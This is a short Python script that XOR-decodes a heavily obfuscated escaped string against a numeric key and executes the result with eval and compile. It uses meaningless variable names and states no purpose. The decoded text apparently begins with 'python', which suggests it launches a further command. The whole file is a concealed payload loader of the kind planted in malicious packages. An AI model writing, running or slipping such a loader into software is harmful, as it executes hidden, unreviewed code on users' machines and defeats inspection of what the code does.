wopvEaTEcopFEavc ="@IF^_W\x05\x18\x15S\x19\x12XUBZAE\x16@\\W^]A\x1fF@[DD\\UVDC\x14YJ\n@\x08C[S[WL\x1aKVU]PM\x10DXSS\\L\x1aurh{|wm\x1cFZV[UD\x1dcwp|ijeg|py\x1a\x0fG\x17[WX\\\\[A\x18\x18\x10\x07\t\x0b\x18\t\x0e\x08\x17\x03\x04\x16\x01\x17\x1f\x04\x06\x06\x03\x1d\x1c\x03Z@\x1bQLD\x04\x1bE\x1dQYTSW^\x1b\x1c\x1c\x04\x19\x0b\x12WG\x16]CF\x07\x11K\x19QYT\\V[\x1c\x1d\x1b\x03\x1b\tVC\x1bQ@@\x02\x18@\x1e^Z[SW^\x1d\x10\x1d\x06\x1a\x0f]THWDF\x19HAI\x0b\x12FD@\x18KHQN[\x19\x1aA]\x11\x18\x11" 

iOpvEoeaaeavocp = "0026096880951825316334585355946363708691350400284896659877089844472229055500030837691591434498862985"
uocpEAtacovpe = len(wopvEaTEcopFEavc)
oIoeaTEAcvpae = ""
for fapcEaocva in range(uocpEAtacovpe):
    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]
    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]
    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))


eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))